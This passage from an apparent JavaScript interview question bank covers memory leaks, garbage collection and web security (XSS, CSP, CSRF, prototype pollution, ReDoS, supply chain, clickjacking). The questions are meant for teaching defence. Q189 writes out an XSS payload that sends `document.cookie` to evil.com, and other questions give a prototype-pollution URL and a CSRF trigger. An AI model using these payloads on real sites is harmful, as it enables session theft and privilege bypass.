## SECTION 30: Memory Management (Q178–Q183)

### Q178
- **Difficulty:** Medium
- **Topic:** Memory Management
- **Problem Statement:** Explain the JavaScript memory lifecycle (allocate → use → release) and how it differs from manually-managed languages (C/C++). Identify and fix FOUR distinct memory leak patterns in the following code: accidental global variables, forgotten timers/intervals, detached DOM references held in closures, and an ever-growing cache with no eviction policy.
```js
function leaky() {
  globalCache = {}; // missing declaration
  setInterval(() => { /* never cleared */ }, 1000);
  const el = document.getElementById('item');
  document.body.removeChild(el);
  window.lastEl = el; // detached node, still referenced
  globalCache[Date.now()] = new Array(1000000); // unbounded
}
```
- **Expected Time Complexity:** O(1) per fix
- **Expected Space Complexity:** O(1) after fixes vs unbounded growth before
- **Hints:** Use `'use strict'` to catch accidental globals at parse/runtime; always pair `setInterval` with a stored ID and `clearInterval`; null out references to detached DOM nodes when no longer needed; apply Q127's LRU pattern for caches.
- **Edge Cases:** A detached DOM node referenced by MULTIPLE different closures/variables (must clear ALL references for garbage collection — partial cleanup doesn't help).

### Q179
- **Difficulty:** Hard
- **Topic:** Memory Management
- **Problem Statement:** Explain how to use Chrome DevTools' Memory panel to diagnose a leak (heap snapshots comparison technique: take a snapshot, perform the suspected leaking action N times, take another snapshot, and look at "objects allocated between snapshots" / use the "comparison" view to find object counts that grow unboundedly). Walk through a realistic scenario: a SPA where navigating between routes 50 times causes memory to grow continuously instead of stabilizing, and describe the systematic debugging process to identify whether the leak is in event listeners, closures, or a state-management library not cleaning up subscriptions.
- **Expected Time Complexity:** N/A — diagnostic methodology question
- **Expected Space Complexity:** N/A
- **Hints:** Look for "Detached HTMLDivElement" (or similar) entries in heap snapshots with high "Retained Size" — these indicate DOM nodes kept alive by JS references despite being removed from the document; the "retainers" view shows EXACTLY what's holding the reference (the actual root cause).
- **Edge Cases:** A leak that only manifests after MANY iterations (slow leak) vs one that's obvious after a single action — discuss why taking 2-3 snapshots (not just before/after) at different iteration counts helps distinguish a genuine leak (linear/continuous growth) from one-time setup cost or GC timing noise (memory that grows then stabilizes/gets collected).

### Q180
- **Difficulty:** Hard
- **Topic:** Memory Management
- **Problem Statement:** Explain `WeakRef` (ES2021) and `FinalizationRegistry`: their purpose (holding a reference to an object WITHOUT preventing its garbage collection, and being notified after it's collected), and why they are explicitly NOT recommended for normal application logic (GC timing is non-deterministic and implementation-specific — `FinalizationRegistry` callbacks are NOT guaranteed to ever run, e.g., if the program exits first). Implement a simple example: a `Cache` that holds VALUES via `WeakRef` so cached objects can still be garbage collected under memory pressure even while "cached" (a memory-sensitive cache, contrasting with the strong-reference LRU cache from Q127), with a `FinalizationRegistry` used purely for OPTIONAL cleanup logging (not relied upon for correctness).
- **Expected Time Complexity:** O(1) for get (with a `.deref()` check); cache effectively self-prunes via GC rather than explicit eviction
- **Expected Space Complexity:** O(1) per entry for the `WeakRef` itself (the referenced object's memory is NOT counted against the cache once eligible for GC)
- **Hints:** `cache.get(key)?.deref()` — must check if `deref()` returns `undefined` (meaning the object was already collected) and treat that as a cache miss; the FinalizationRegistry callback should NEVER be used for anything functionally important (e.g., don't rely on it to release a file handle or network connection — use explicit `try/finally`/`using` for that).
- **Edge Cases:** A `WeakRef`'s target being collected BETWEEN a `.deref()` call returning the object and your code finishing using it (not actually possible mid-synchronous-execution in JS's single-threaded model — explain why this specific race condition CAN'T happen, providing some safety despite GC non-determinism), code that MISTAKENLY relies on `FinalizationRegistry` firing promptly or at all (anti-pattern — discuss a real-world case where this assumption caused a production bug).

### Q181
- **Difficulty:** Staff
- **Topic:** Memory Management
- **Problem Statement:** Design memory-efficient handling for a frontend application that needs to display a live, auto-updating chart of the last 24 hours of sensor data arriving via WebSocket at 10 updates/second (864,000 potential data points/day), while keeping memory usage BOUNDED. Discuss: (a) a ring buffer / circular buffer data structure (fixed-size, O(1) insertion, automatically overwrites oldest data) vs an unbounded array with periodic trimming, (b) using `Float64Array`/typed arrays instead of a plain array of numbers for the SPECIFIC memory density benefit (no per-element object/boxing overhead, contiguous memory), and (c) DOWNSAMPLING strategy for rendering (you don't need to render 864,000 points on a 1200px-wide chart — implement a simple `downsample(data, targetPoints)` using either naive striding or a min/max-preserving bucket approach like LTTB (Largest-Triangle-Three-Buckets, describe conceptually) to preserve visual fidelity of peaks/valleys despite reducing point count).
- **Expected Time Complexity:** O(1) for ring buffer insertion; O(n) for downsampling where n = total stored points
- **Expected Space Complexity:** O(c) fixed, where c = ring buffer capacity (e.g., sized for 24h at the known update rate), using `Float64Array` for ~8 bytes/point vs significantly more for boxed numbers in a plain array
- **Hints:** A ring buffer over a pre-allocated `Float64Array` avoids both unbounded growth AND the repeated allocation/GC pressure of `array.shift()` (which is O(n) per call — a common naive-but-costly approach to "keep only the last N items").
- **Edge Cases:** The WebSocket sending BURSTS faster than 10/sec temporarily (does the ring buffer's fixed capacity assumption still hold, or could legitimate recent data be overwritten prematurely — discuss sizing the buffer with headroom), naive `array.shift()`-based trimming approach's O(n) cost per insertion at 10/sec sustained over hours — quantify why this becomes a real performance problem at scale (864,000 inserts/day × O(n) shift cost each) vs the ring buffer's O(1).

### Q182
- **Difficulty:** Hard
- **Topic:** Memory Management
- **Problem Statement:** Explain why CLOSURES that capture LARGE objects but only use a SMALL piece of them can cause unexpectedly high memory retention, using a concrete example: a function that destructures `{ id }` from a huge `user` object inline at the closure boundary vs one that captures the entire `user` object even though only `user.id` is ever used inside. Demonstrate the difference and explain whether modern V8 actually performs "closure capture analysis" to only retain the SPECIFICALLY USED variables (it does, to a significant degree, in modern engines — but this isn't guaranteed across all engines/versions, so explicit minimal capture remains a defensive best practice).
- **Expected Time Complexity:** O(1)
- **Expected Space Complexity:** O(1) for the minimal-capture version vs potentially O(n) (size of the unused parts of `user`) for the full-object-capture version, MODULO actual engine optimization behavior
- **Hints:** `const { id } = user; return () => doSomething(id);` vs `return () => doSomething(user.id);` — the FIRST extracts just the primitive value before closure creation; discuss that for a PRIMITIVE like `id`, this matters; for capturing a NESTED OBJECT REFERENCE the user actually needs, this technique doesn't help (you still need the reference).
- **Edge Cases:** A closure that captures a variable used in DEAD CODE within the closure body (e.g., behind an `if (false)` or a flag that's always false in practice) — does the engine's static analysis still retain it (likely yes, since proving the branch unreachable in general is undecidable/not always attempted) — discuss removing genuinely dead code as the real fix rather than relying on engine cleverness.

### Q183
- **Difficulty:** Staff
- **Topic:** Memory Management
- **Problem Statement:** A Node.js server's memory (RSS) grows steadily under sustained load and is eventually OOM-killed by the orchestrator (e.g., Kubernetes) every few hours, requiring a pod restart — a classic "slow leak in production" scenario. Design a systematic production diagnostic approach WITHOUT requiring a full outage or local reproduction: (a) using `--max-old-space-size` and heap usage metrics exposed via `process.memoryUsage()` scraped into a monitoring system (Prometheus/Grafana) to confirm the leak's growth RATE and correlate it with deploy times/traffic patterns, (b) capturing a heap snapshot from a LIVE production process safely (e.g., via `v8.writeHeapSnapshot()` triggered by an internal admin endpoint or signal handler, mindful of the snapshot's own memory/CPU cost and blocking nature on the event loop), (c) comparing snapshots taken hours apart to identify the leaking object type via retainer analysis (same technique as Q179 but applied to a server, and via the offline analysis of the exported snapshot file in DevTools rather than live in-browser).
- **Expected Time Complexity:** N/A — diagnostic process
- **Expected Space Complexity:** N/A
- **Hints:** `v8.writeHeapSnapshot()` BLOCKS the event loop while it runs (can be a multi-second pause for a large heap) — this must be done carefully in production (during low-traffic windows, or accepting the brief latency hit, or running on a canary instance taken temporarily out of the load balancer rotation).
- **Edge Cases:** The leak being in a NATIVE addon or a memory region OUTSIDE the V8 heap entirely (e.g., a Buffer pool, a native module's own allocations) — heap snapshots only show JS-heap objects, so RSS growing faster/differently than the JS heap size suggests looking elsewhere (native memory profiling tools, `process.memoryUsage().external`/`arrayBuffers` as a first signal).

---

## SECTION 31: Garbage Collection (Q184–Q188)

### Q184
- **Difficulty:** Medium
- **Topic:** Garbage Collection
- **Problem Statement:** Explain the "mark-and-sweep" garbage collection algorithm (the primary strategy used by V8 and most modern JS engines) and how it determines "reachability" from a set of "roots" (global object, currently executing function's local variables/call stack). Contrast this with "reference counting" garbage collection (used by some older systems) and explain SPECIFICALLY why reference counting fails for CIRCULAR references (two objects referencing each other, neither reachable from roots, but each has a non-zero reference count) while mark-and-sweep correctly identifies and collects them.
- **Expected Time Complexity:** O(live objects) for mark phase; O(heap size) for sweep phase, in a basic (non-incremental) implementation
- **Expected Space Complexity:** O(d) for the mark phase's traversal stack/queue, d = graph depth/breadth depending on traversal strategy
- **Hints:** Mark-and-sweep starts from ROOTS and traverses outward, marking everything REACHABLE — anything left UNMARKED after traversal (regardless of how many other unreachable objects point to it) is garbage; reference counting never "looks outward from roots," it only tracks IN-DEGREE, which circular-but-unreachable structures keep artificially non-zero.
- **Edge Cases:** A massive object graph causing the mark phase to take a long time (motivating GENERATIONAL and INCREMENTAL strategies, covered in Q185), the difference between this and "tracing garbage collection" terminology generally (mark-and-sweep is ONE kind of tracing GC).

### Q185
- **Difficulty:** Hard
- **Topic:** Garbage Collection
- **Problem Statement:** Explain V8's GENERATIONAL garbage collection strategy: the "young generation" (Scavenger, using a fast copying/semi-space algorithm, collected FREQUENTLY since most objects die young — the "generational hypothesis") vs the "old generation" (Major GC / Mark-Compact, collected LESS frequently since surviving objects tend to live long, using mark-sweep-compact to also defragment memory). Explain object PROMOTION: when and why an object moves from young to old generation (surviving multiple young-gen collections, or being directly allocated as large). Discuss why understanding this distinction helps explain a common performance anti-pattern: creating many SHORT-LIVED objects in a hot loop (e.g., `{x, y}` coordinate objects created and discarded every frame) being relatively CHEAP due to fast young-gen collection, vs objects that ACCIDENTALLY survive into old-gen due to a leak then requiring more expensive major GC passes.
- **Expected Time Complexity:** O(live objects in young gen) for Scavenger (fast, since it only copies SURVIVORS, proportional to what's ALIVE not the whole young-gen space); O(live objects in old gen) for Mark-Compact (more expensive due to old-gen typically being larger and the compaction step)
- **Expected Space Complexity:** O(young gen size) reserved upfront (typically small, a few MB, split into two semi-spaces for the copying algorithm); old generation grows as needed up to heap limits
- **Hints:** "Most objects die young" is the empirical observation underpinning generational GC's effectiveness — relate this back to Q174/Q170's discussion of short-lived intermediate objects (e.g., from `.map()` chains) being less concerning than they might intuitively seem, performance-wise, PRECISELY because the young-gen collector handles them cheaply (though this doesn't mean they're FREE — discuss the nuance).
- **Edge Cases:** An object that's borderline (survives 1-2 young-gen collections but then becomes garbage right before promotion) — does it still pay SOME extra cost vs a truly short-lived object, even if it never reaches old-gen (yes — surviving even one Scavenger pass means being COPIED, which has a cost, however small)?

### Q186
- **Difficulty:** Staff
- **Topic:** Garbage Collection
- **Problem Statement:** Explain "stop-the-world" pauses in garbage collection and V8's mitigations: INCREMENTAL marking (breaking the mark phase into small steps interleaved with JS execution, rather than one long pause), CONCURRENT marking/sweeping (performing GC work on background threads in parallel with the main thread's JS execution, further reducing main-thread pause time), and LAZY sweeping. Explain why, DESPITE these optimizations, a full "Major GC" can still cause a noticeable pause (tens of milliseconds) on a large heap, and why this matters specifically for LATENCY-SENSITIVE applications (e.g., real-time trading dashboards, games) more than for typical request/response web apps where a single GC pause is usually imperceptible. Propose application-level mitigations: object pooling (reusing object instances instead of allocating/discarding, reducing GC pressure — relate to Q181's ring buffer as a related "avoid churn" pattern) for the SPECIFIC case of high-frequency allocations in a hot path like a game loop.
- **Expected Time Complexity:** Discussion-based; incremental/concurrent GC aims for sub-millisecond INDIVIDUAL pause increments, though cumulative GC work still consumes CPU budget that competes with the main thread for SOME resources even when "concurrent"
- **Expected Space Complexity:** N/A
- **Hints:** Object pooling trades INCREASED code complexity (manual "checkout"/"return" lifecycle management, risk of bugs if an object is used after being "returned" to the pool) for REDUCED GC pressure — this is a genuine engineering trade-off, not a free win, and should be reserved for genuinely hot, allocation-heavy paths after PROFILING confirms GC is a measured bottleneck (avoid premature optimization, per the general performance-engineering principle).
- **Edge Cases:** An object pool that's NOT properly reset between uses (stale data from a previous "borrower" leaking into the next user of a pooled object — a real and common bug class introduced by object pooling) — discuss a `reset()` convention/discipline to mitigate this.

### Q187
- **Difficulty:** Hard
- **Topic:** Garbage Collection
- **Problem Statement:** Explain how `Map`/`Set` vs `WeakMap`/`WeakSet` differ specifically with respect to garbage collection eligibility of their KEYS (for `Map`/`WeakMap`) — a `Map` holds STRONG references to its keys (and values), preventing their collection as long as the `Map` itself is alive, even if NOTHING ELSE references those keys; a `WeakMap` holds WEAK references to keys specifically, allowing them to be collected once no OTHER strong references exist, at which point the entry is automatically (eventually) removed from the `WeakMap`. Given a real scenario — associating metadata with DOM nodes (e.g., "has this node already been processed by my library") — explain why `WeakMap` is the CORRECT choice over a regular `Map` keyed by DOM node, preventing a memory leak where removed DOM nodes would otherwise be kept alive forever just because they're still a key in your metadata `Map`.
- **Expected Time Complexity:** O(1) for get/set in both
- **Expected Space Complexity:** O(n) strong (Map, n = entries, persisting even for unreferenced-elsewhere keys) vs O(n) weak (WeakMap, n shrinks automatically as keys become otherwise-unreferenced and are collected)
- **Hints:** This directly relates back to Q58's private-field pattern and Q180's `WeakRef`-based cache — the unifying theme across all three is "associate data with an object's LIFETIME without EXTENDING that lifetime."
- **Edge Cases:** Code that ITERATES over all entries to "clean up" — `WeakMap`/`WeakSet` are DELIBERATELY NOT ITERABLE (no `.keys()`, `.entries()`, `.forEach()`, `.size`) PRECISELY because their contents can change at ANY time due to GC (which is non-deterministic in timing) — iterating something whose size changes unpredictably mid-iteration would be unsound; discuss why this design constraint, while sometimes inconvenient, is a deliberate and correct API choice.

### Q188
- **Difficulty:** Staff
- **Topic:** Garbage Collection
- **Problem Statement:** Design a custom object pool implementation (building on Q186's mitigation strategy) for a canvas-based game engine that creates/destroys thousands of `Particle` objects per second during explosion effects. Implement `ParticlePool` with `acquire()` (returns a recycled or newly-created particle), `release(particle)` (returns it to the pool, calling a `reset()` method to clear stale state), and a `preallocate(count)` method to warm the pool ahead of time (avoiding allocation spikes DURING gameplay, e.g., at level start when you know explosions are imminent). Discuss how to detect/guard against the "use-after-release" bug class (a particle still being referenced and used by game logic AFTER it's been released back to the pool and potentially re-acquired and mutated by a DIFFERENT part of the code) — propose a generation-counter or "is this particle still mine" validation scheme as a defensive measure.
- **Expected Time Complexity:** O(1) for `acquire`/`release` (amortized, using an array/stack as the pool's backing structure)
- **Expected Space Complexity:** O(capacity) for the pool, sized to the realistic peak concurrent particle count
- **Hints:** A generation counter: each particle has a `generation` field, incremented every time it's released; code holding a "logical reference" to a particle also stores the generation it observed; before USING a particle via such a reference, check `particle.generation === observedGeneration` — if they mismatch, the particle has been recycled and the reference is STALE (treat as invalid/no-op rather than corrupting state).
- **Edge Cases:** The pool running OUT of available particles during a massive simultaneous explosion (more `acquire()` calls than pooled capacity) — should it grow dynamically (defeating some of the "avoid allocation spikes" purpose, but at least not CRASHING), cap visual effects (drop some particles), or some hybrid (grow up to a hard ceiling, then drop)? Justify a specific choice for a real-time game context where a brief allocation spike might be more acceptable than visibly missing particles, or vice versa.

---

## SECTION 32: Security (Q189–Q196)

### Q189
- **Difficulty:** Medium
- **Topic:** Security
- **Problem Statement:** Explain Cross-Site Scripting (XSS) in its three main forms: Stored, Reflected, and DOM-based. Given a vulnerable code snippet that uses `innerHTML` to render user-submitted comments directly, explain the exploit (a comment containing `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`), and fix it using `textContent` (when no HTML formatting is needed) or proper sanitization (e.g., conceptually using a library like DOMPurify when SOME HTML must be allowed, like basic markdown-rendered formatting).
- **Expected Time Complexity:** O(n) for sanitization where n = input length
- **Expected Space Complexity:** O(n)
- **Hints:** `textContent` NEVER parses its input as HTML — it's the safest default when displaying plain user text; relying on a denylist of "dangerous" tags/attributes is fragile (attackers find creative bypasses) — prefer an allowlist-based sanitizer.
- **Edge Cases:** User content that needs to preserve SOME formatting (line breaks, bold text) — explain why naively replacing `\n` with `<br>` via string concatenation BEFORE setting `innerHTML` reintroduces the SAME XSS risk if the original text isn't ALSO escaped first (escape THEN format, not format then trust).

### Q190
- **Difficulty:** Hard
- **Topic:** Security
- **Problem Statement:** Explain Content Security Policy (CSP) as a defense-in-depth mechanism against XSS: how directives like `script-src 'self'`, `script-src 'nonce-{random}'`, and the explicit AVOIDANCE of `'unsafe-inline'`/`'unsafe-eval'` prevent injected `<script>` tags or inline event handlers from executing even if an XSS injection succeeds in getting markup into the page. Walk through how a NONCE-based CSP works end-to-end: the server generates a random nonce per request, includes it in the CSP header AND on legitimate `<script nonce="...">` tags, and the browser refuses to execute any script WITHOUT a matching nonce — explain why this defeats injected scripts (the attacker doesn't know the server-generated nonce in advance).
- **Expected Time Complexity:** O(1) per request for nonce generation
- **Expected Space Complexity:** O(1)
- **Hints:** The nonce MUST be cryptographically random and UNIQUE PER REQUEST (reusing the same nonce across requests/being predictable defeats the protection, since an attacker who learns ONE nonce could potentially exploit a TIMING window or, worse, if it's static, simply always know it).
- **Edge Cases:** Third-party scripts (analytics, ads) that need to be allowed — explain the trade-off of widening `script-src` to include specific trusted origins vs the security cost of trusting THEIR code/supply chain (a third-party script compromise becomes YOUR XSS vulnerability too — relate to real-world supply-chain attacks on popular JS libraries/CDNs).

### Q191
- **Difficulty:** Hard
- **Topic:** Security
- **Problem Statement:** Explain Cross-Site Request Forgery (CSRF): how an attacker's malicious site can trigger STATE-CHANGING requests (e.g., a hidden auto-submitting form POSTing to `https://bank.com/transfer`) using the VICTIM'S browser, which automatically attaches their authentication cookies for `bank.com` (since cookies are sent based on the TARGET domain, not the ORIGINATING page). Explain TWO complementary defenses: (1) `SameSite=Lax`/`Strict` cookies (per Q115, preventing the cookie from being sent on cross-site requests in the first place), and (2) the synchronizer token pattern (a CSRF token embedded in forms/headers, validated server-side, that an attacker's cross-origin page CANNOT read due to Same-Origin Policy even if they can trigger the request). Explain why relying on `SameSite` ALONE is risky for OLDER browsers that don't default to `SameSite=Lax`/don't support it, making the CSRF token defense still valuable as defense-in-depth.
- **Expected Time Complexity:** O(1) per request for token validation
- **Expected Space Complexity:** O(1) per active session for token storage
- **Hints:** A GET request that has SIDE EFFECTS (e.g., `GET /api/delete-account`) is ESPECIALLY vulnerable since it can be triggered by something as simple as `<img src="https://victim-site.com/api/delete-account">` on an attacker's page — reinforcing why GET should NEVER have side effects (relates to HTTP semantics/REST principles).
- **Edge Cases:** A CSRF token that's the SAME for the entire user session vs ROTATED per request/form (per-request rotation is more secure against token leakage via, e.g., a referrer header leak, but adds complexity for multi-tab usage where an OLD tab's token might become stale — discuss this UX/security trade-off).

### Q192
- **Difficulty:** Staff
- **Topic:** Security
- **Problem Statement:** Conduct a security review (as a structured exercise) of the following authentication flow for a SPA and identify AT LEAST FIVE distinct vulnerabilities, explaining the exploit and fix for each: (1) JWT stored in `localStorage`, (2) JWT contains sensitive PII directly in its payload (not just an opaque ID) since JWTs are BASE64-encoded, NOT encrypted, and trivially decodable client-side by anyone, (3) no token expiration set (`exp` claim missing or extremely long-lived), (4) the login endpoint has no rate limiting, allowing brute-force password guessing, (5) password reset tokens are sent via a predictable/sequential ID in the reset link rather than a cryptographically random token, (6) CORS configured with `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` (which is actually INVALID per spec when using `*`, but discuss what happens with a MISCONFIGURED reflective-origin setup that effectively achieves the same dangerous result).
- **Expected Time Complexity:** N/A — security review exercise
- **Expected Space Complexity:** N/A
- **Hints:** For (6), explain that browsers actually REJECT `Access-Control-Allow-Origin: *` when credentials are involved — but a common MISTAKE is for servers to dynamically REFLECT the request's `Origin` header back as the allowed origin (instead of validating against an allowlist), which technically satisfies the spec's requirement for a specific (non-wildcard) origin while still allowing ANY origin to make credentialed requests — explain why this is just as dangerous as a true wildcard, despite appearing more "specific."
- **Edge Cases:** N/A — comprehensive security audit question; a strong answer prioritizes vulnerabilities by SEVERITY/exploitability, not just lists them.

### Q193
- **Difficulty:** Hard
- **Topic:** Security
- **Problem Statement:** Explain "prototype pollution" again but from the ATTACK-SURFACE perspective specifically for CLIENT-SIDE applications (building on Q33's mechanism explanation): given a vulnerable client-side library function that merges URL query parameters into a config object (`Object.assign(config, parseQueryString(location.search))`), explain how an attacker crafting a malicious URL (`?__proto__[isAdmin]=true` or similar, depending on the exact query-parsing library's behavior with bracket notation) could be used to pollute `Object.prototype` for EVERY object in the page, and how this could be chained with OTHER code patterns (e.g., a permission check like `if (someObject.isAdmin)` that NORMALLY relies on `someObject` not having that property, suddenly succeeding for ALL objects due to the polluted prototype) to achieve a privilege escalation or logic-bypass vulnerability PURELY client-side, without any server interaction.
- **Expected Time Complexity:** O(1) for the exploit itself
- **Expected Space Complexity:** O(1)
- **Hints:** This is a good example of why a vulnerability's IMPACT often depends on a CHAIN of multiple weaknesses (the polluting merge function ALONE is the root cause, but the IMPACT only materializes when COMBINED with code elsewhere that does unsafe property existence checks) — discuss "defense in depth" as the mitigation philosophy: fix the merge function (Q33's safe deep-merge), AND avoid relying on implicit prototype-chain property absence for security-sensitive checks (use `Object.hasOwn(obj, 'isAdmin')` instead of `obj.isAdmin`, which is also immune to this specific pollution vector).
- **Edge Cases:** A query-string PARSING library that doesn't even support bracket/dot notation for nested keys (e.g., simple `URLSearchParams`) — does this fully eliminate the risk, or could a DIFFERENT merge target (e.g., merging a JSON request body, not just query params) reintroduce the same class of vulnerability elsewhere in the app?

### Q194
- **Difficulty:** Hard
- **Topic:** Security
- **Problem Statement:** Explain "ReDoS" (Regular Expression Denial of Service): how certain regex patterns with NESTED QUANTIFIERS and ALTERNATION (e.g., `(a+)+$` or `(a|a)*$`) can exhibit CATASTROPHIC BACKTRACKING — exponential time complexity relative to input length — when matched against a carefully crafted "almost matching" input (e.g., `'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'` against `(a+)+$`). Given a vulnerable email-validation regex pulled from a real-world source, identify the vulnerable construct, explain the backtracking mechanism causing exponential blowup, and rewrite it to be ReDoS-safe (e.g., using a POSSESSIVE-quantifier-equivalent approach via non-capturing groups restructured to avoid ambiguity, or simply using a SIMPLER, less "clever" regex, or delegating to a well-vetted validation library).
- **Expected Time Complexity:** O(2^n) for the VULNERABLE pattern on adversarial input (the vulnerability itself); O(n) for a correctly-constructed safe equivalent
- **Expected Space Complexity:** O(n) for the backtracking call stack in the vulnerable case (also a DoS vector via stack exhaustion, not just CPU time)
- **Hints:** The root cause is AMBIGUITY in how the regex engine can partition the input across the nested/alternated quantifiers — multiple equally-valid ways to "fail" to match force the backtracking engine to try ALL of them before giving up; restructuring to remove the ambiguity (e.g., `a+$` instead of `(a+)+$` when they're semantically equivalent for VALID matches but the unrolled version has no backtracking ambiguity) eliminates the exponential blowup.
- **Edge Cases:** A regex that's safe against THIS specific attack pattern but has a DIFFERENT catastrophic input for a different sub-pattern — emphasize that ReDoS analysis requires examining the FULL pattern, not just pattern-matching against "known bad" snippets; mention tools like `safe-regex` or timeout-based regex execution (where supported) as additional defense-in-depth for user-influenced regex patterns.

### Q195
- **Difficulty:** Staff
- **Topic:** Security
- **Problem Statement:** Explain "supply chain security" risks for npm dependencies: a popular package your app depends on (even TRANSITIVELY, several levels deep) could be compromised (account takeover of the maintainer, a malicious version published, "typosquatting" a similar-named package) and execute ARBITRARY CODE during `npm install` (via `postinstall` scripts) or at RUNTIME within your application (since npm packages have FULL ACCESS to Node.js APIs by default — file system, network, environment variables containing secrets). Propose a defense-in-depth strategy: (a) `package-lock.json`/exact version pinning to prevent SILENT updates to a compromised version, (b) automated dependency vulnerability scanning (`npm audit`, Snyk, Dependabot) integrated into CI, (c) minimizing `postinstall` script execution risk (e.g., `npm config set ignore-scripts true` where feasible, understanding the trade-off that SOME legitimate packages need install scripts for native bindings), (d) Subresource Integrity (SRI) hashes for any THIRD-PARTY SCRIPTS loaded directly via `<script src="...">` from a CDN in your HTML (a related but distinct supply-chain vector from npm itself), and (e) the principle of LEAST PRIVILEGE for CI/build environments (build processes shouldn't have access to PRODUCTION secrets/credentials they don't need).
- **Expected Time Complexity:** N/A — security architecture question
- **Expected Space Complexity:** N/A
- **Hints:** SRI works by specifying an expected cryptographic hash in the `integrity` attribute (`<script src="..." integrity="sha384-...">`) — the browser refuses to EXECUTE the script if the fetched content's hash doesn't match, protecting against a CDN-level compromise or man-in-the-middle tampering, but NOT against the legitimate source itself being compromised at the time YOU generated the hash (i.e., SRI protects against TRANSIT/CDN tampering, not against the original file already being malicious when you pinned it).
- **Edge Cases:** A legitimate package UPDATE that's needed for a critical security fix in THAT package, but your `ignore-scripts`/strict-pinning policy slows down adopting it — discuss balancing supply-chain caution against the ALSO-real risk of running OUTDATED, vulnerable dependencies (security is about managing trade-offs, not eliminating all risk).

### Q196
- **Difficulty:** Hard
- **Topic:** Security
- **Problem Statement:** Explain "clickjacking" (UI redress attack): an attacker embeds your legitimate site in an invisible/transparent `<iframe>` overlaid on their own deceptive page, tricking users into clicking what THEY THINK is a benign button on the attacker's page, but is ACTUALLY a sensitive action button (e.g., "Confirm Purchase," "Delete Account") on YOUR site rendered underneath. Explain the THREE primary defenses: the `X-Frame-Options` HTTP header (`DENY`/`SAMEORIGIN`, the older mechanism), the modern CSP `frame-ancestors` directive (more flexible, supports an allowlist of specific origins permitted to frame your site, superseding `X-Frame-Options` in browsers that support CSP Level 2+), and client-side "frame-busting" JavaScript (`if (window.top !== window.self) { window.top.location = window.self.location; }` — explain why this LEGACY technique is considered UNRELIABLE/insufficient as a sole defense (e.g., can be neutralized by an attacker using the `sandbox` attribute on their iframe to disable JS execution within it, while still rendering your visible content for the clickjacking overlay).
- **Expected Time Complexity:** O(1)
- **Expected Space Complexity:** O(1)
- **Hints:** Header-based defenses (`X-Frame-Options`/CSP `frame-ancestors`) are enforced by the BROWSER itself BEFORE your page's JavaScript even runs, making them robust against the sandboxed-iframe bypass that defeats frame-busting scripts — this is a strong illustration of why SERVER-ENFORCED security headers are generally more robust than CLIENT-SIDE JavaScript-based defenses for this class of attack.
- **Edge Cases:** A LEGITIMATE use case where YOUR site needs to be embedded in an iframe by a SPECIFIC trusted partner site (e.g., a widget) — explain how `frame-ancestors https://partner.com` allows this narrow exception while still blocking arbitrary/malicious framing, which `X-Frame-Options: DENY` could not accommodate (it's all-or-nothing, lacking `frame-ancestors`' allowlist granularity).

---
